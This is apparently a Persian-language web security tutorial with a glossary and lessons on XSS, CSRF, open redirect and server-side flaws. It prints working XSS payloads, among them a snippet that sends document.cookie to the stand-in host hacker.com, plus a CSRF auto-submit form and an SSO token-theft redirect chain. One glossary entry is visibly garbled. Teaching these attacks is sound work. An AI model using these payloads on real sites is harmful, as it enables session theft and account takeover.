فرهنگ اصطلاحات / Glossary

اصطلاح / Term تعریف / Definition
Web Siteمجموعه‌ای از صفحات HTML ثابت که اطلاعات نمایش می‌دهند و تعامل کمی با کاربر دارند.
Web Applicationنرم‌افزاری تحت وب که پردازش پویا انجام می‌دهد، با پایگاه داده ارتباط دارد و تجربه کاربری تعاملی ایجاد می‌کند.
Static Contentمحتوای ثابت که بدون پردازش سمت‌سرور مستقیماً برای کاربر ارسال می‌شود (HTML, CSS, JS, PNG).
Dynamic Contentمحتوایی که در لحظه درخواست توسط سرور تولید می‌شود (PHP, ASP, JSP).
Frameworkمجموعه‌ای از کتابخانه‌ها و ابزارهاPHP, ASP, JSP).
Frameworkمجموعه‌ای از کتابخانه‌ها و ابزارهاند.
Open Sourceنرم‌افزاری که کد منبع آن در دسترس عموم است و می‌توان آن را آزادانه استفاده، تغییر و توزیع کرد.
Closed Sourceنرم‌افزاری که کد منبع آن محرمانه است و فقط توسط سازنده قابل دسترسی است.
Client Sideعملیاتی که در مرورگر کاربر اجرا می‌شود (HTML, CSS, JavaScript).
Server Sideعملیاتی که روی سرور وب اجرا می‌شود و نتیجه آن به مرورگر ارسال می‌شود.
XSSCross-Site Scripting — تزریق کد مخرب JavaScript در صفحات وب برای اجرا در مرورگر قربانی.
CSRFCross-Site Request Forgery — جعل درخواست از سمت کاربر؛ هکر کاربر احراز هویت شده را فریب می‌دهد تا درخواست ناخواسته ارسال کند.
SQL Injectionتزریق دستورات SQL مخرب به ورودی‌های برنامه برای دستکاری یا استخراج اطلاعات پایگاه داده.
SSRFServer-Side Request Forgery — مجبور کردن سرور به ارسال درخواست به منابع داخلی یا خارجی.
PIIPersonally Identifiable Information — اطلاعات شناسایی شخصی مانند نام، ایمیل، شماره ملی.
Sensitive Data Exposureافشای اطلاعات حساس به دلیل مدیریت نادرست داده در سمت کلاینت یا سرور.
Open Redirectآسیب‌پذیری‌ای که اجازه می‌دهد کاربر به URL دلخواه مهاجم هدایت شود.
Reflected XSS (RXSS)نوعی XSS که payload در URL تعبیه شده و فوراً در پاسخ سرور بازتاب می‌یابد.
Stored XSS (SXSS)نوعی XSS که payload در پایگاه داده ذخیره شده و هر بار صفحه لود می‌شود اجرا می‌گردد.
DOM XSS (DXSS)نوعی XSS که در سمت کلاینت و از طریق دستکاری DOM اجرا می‌شود بدون ارسال payload به سرور.
Blind XSS (BXSS)نوعی XSS که اجرای آن در پنل ادمین یا محیطی است که مهاجم مستقیماً نمی‌بیند.
CSRF Tokenیک توکن تصادفی منحصربه‌فرد که با هر درخواست ارسال می‌شود تا از جعل درخواست جلوگیری کند.
Command Injectionتزریق دستورات سیستم‌عامل به ورودی برنامه برای اجرای دستورات مخرب روی سرور.
Shell Uploadآپلود فایل اجرایی مخرب (مثل PHP shell) به سرور برای کنترل از راه دور.
CRUDCreate, Read, Update, Delete — چهار عملیات پایه در پایگاه داده.
SQL UNIONدستور ترکیب نتایج دو یا چند SELECT با شرط یکسان بودن تعداد ستون‌ها.
Event Handlerتابعی در JavaScript که در پاسخ به یک رویداد (کلیک، خطا و ...) اجرا می‌شود.
DOM Sourceمحل دریافت ورودی کاربر در DOM مانند location.hash یا location.search.
DOM Sinkمحلی در DOM که داده‌های تحت کنترل کاربر در آن درج می‌شوند مانند innerHTML.
Path Traversalآسیب‌پذیری دسترسی به فایل‌های خارج از دایرکتوری مجاز از طریق مسیرهای نسبی (../).
SSOSingle Sign-On — سیستم احراز هویت یکپارچه که با یک ورود به چند سرویس دسترسی می‌دهد.
Relational DBپایگاه داده‌ای که داده‌ها را در جداول مرتبط ذخیره می‌کند و از SQL استفاده می‌کند.
NoSQL DBپایگاه داده غیررابطه‌ای که داده‌ها را به صورت سند، گراف یا کلید-مقدار ذخیره می‌کند.
02

وب‌سایت در مقابل وب‌اپلیکیشن

وب‌سایت مجموعه‌ای از صفحات مرتبط است که معمولاً اطلاعات ثابت نمایش می‌دهند. وب‌اپلیکیشن نرم‌افزاری تعاملی است که در مرورگر اجرا شده و پردازش پیچیده‌تری انجام می‌دهد.

محتوای استاتیک (Static)

.html .css .js .png .jpg
  • .html — ساختار صفحه وب با زبان نشانه‌گذاری
  • .css — استایل‌شیت برای طراحی ظاهر صفحات
  • .js — اسکریپت جاوااسکریپت برای تعامل در مرورگر
  • .png / .jpg — تصاویر گرافیکی

محتوای دینامیک (Dynamic)

.php .asp .jsp
  • .php — PHP — زبان سرور ساید متداول برای توسعه وب
  • .asp / .aspx — ASP.NET — فریم‌ورک مایکروسافت برای وب
  • .jsp — JavaServer Pages — صفحات سرور ساید با زبان جاوا

05

آسیب‌پذیری‌های کلاینت‌ساید

XSS — Cross-Site Scripting

تزریق کد JavaScript مخرب به صفحات وب که در مرورگر قربانی اجرا می‌شود. هدف اصلی: دزدیدن session cookie، تغییر محتوای صفحه، یا اجرای کد به‌جای کاربر.

روش‌های تزریق JavaScript

۱. Inline Script Tag:

html 
<script>alert("XSS")</script>

۲. External Script از سرور هکر:

html 
<script src="https://hacker.com/1.js"></script>

۳. Event Handler (رویداد HTML):

html 
<img src=invalid onerror="alert(10)">

دزدیدن کوکی با XSS

javascript 
// روش ۱: از طریق script tag
var i = new Image();
i.src = "https://hacker.com/?cookie=" + document.cookie;

// روش ۲: از طریق event handler
// <img src=invalid onerror="i=new Image;i.src='https://hacker.com/?cookie='+document.cookie">

انواع XSS

Reflected XSS (RXSS)

Payload در URL قرار گرفته، سرور آن را بدون sanitize در صفحه بازتاب می‌دهد. کاربر باید لینک مخرب را باز کند.

Stored XSS (SXSS)

Payload در پایگاه داده ذخیره می‌شود (مثل کامنت). هر بار صفحه بارگذاری شود اجرا می‌گردد — خطرناک‌ترین نوع!

DOM XSS (DXSS)

Source → location.hash دریافت ورودی کاربر. Sink → innerHTML اجرای آن. بدون ارسال به سرور.

Blind XSS (BXSS)

Payload در پنل ادمین یا محیطی اجرا می‌شود که مهاجم دسترسی مستقیم ندارد. از external script استفاده می‌شود.

Payload شکستن Context

payload 
'">
<script src="https://hacker.com/1.js"></script>

CSRF — Cross-Site Request Forgery

مهاجم کاربر احراز هویت‌شده را فریب می‌دهد تا درخواست ناخواسته‌ای به سایت هدف ارسال کند. کاربر نمی‌داند چه اتفاقی افتاده!

مثال: تغییر ایمیل کاربر بدون اطلاع او:

html — صفحه مخرب هکر 
<form method="POST" action="https://target.com/change-email">
  <input type="hidden" name="email" value="hacker@evil.com">
  <script>document.forms[0].submit();</script>
</form>

محافظت: CSRF Token

  • در Header: X-CSRF-Token: lxfgvads...random...
  • در Body: email=user@test.com&csrf=lxfgvads...random...

Open Redirect

سایت کاربر را به URL دلخواه مهاجم هدایت می‌کند. معمولاً از طریق پارامترهای redirect استفاده می‌شود.

پارامترهای رایج Open Redirect

redirect return next callback goto continue red_ir go_to

زنجیره: Open Redirect → XSS

attack chain 
// حمله از طریق javascript: URI در href
<a href="javascript:alert(10)">Click me</a>

// دزدیدن توکن از طریق SSO
https://target.com/sso?continue=https://hacker.com
// نتیجه: https://hacker.com/?token=lvxcjbh...

Sensitive Data Exposure — افشای داده حساس

اطلاعات حساس در سمت کلاینت نمایش داده شده و به درستی مدیریت نمی‌شود.
  • PII — Personally Identifiable Information: نام، ایمیل، کد ملی، شماره کارت
  • ذخیره رمز عبور در localStorage یا کوکی بدون رمزنگاری
  • نمایش اطلاعات حساس در HTML Source یا JavaScript
  • ارسال اطلاعات از طریق پارامتر GET در URL
06

آسیب‌پذیری‌های سرورساید

حملاتی که سرور، پایگاه داده یا زیرساخت را تحت تأثیر قرار می‌دهند — بسیار خطرناک‌تر از حملات کلاینت‌ساید.
آسیب‌پذیریتوضیح
SQL Injectionتزریق دستورات SQL به ورودی‌ها برای دستکاری پایگاه داده — استخراج یا حذف داده
Command Injectionتزریق دستورات OS به ورودی‌ها برای اجرا روی سرور (مثل ls, cat, rm)
Shell Uploadآپلود فایل PHP مخرب برای کنترل سرور از راه دور — تغییر محتوای سایت
SSRFمجبور کردن سرور به درخواست به منابع داخلی — دسترسی به metadata cloud
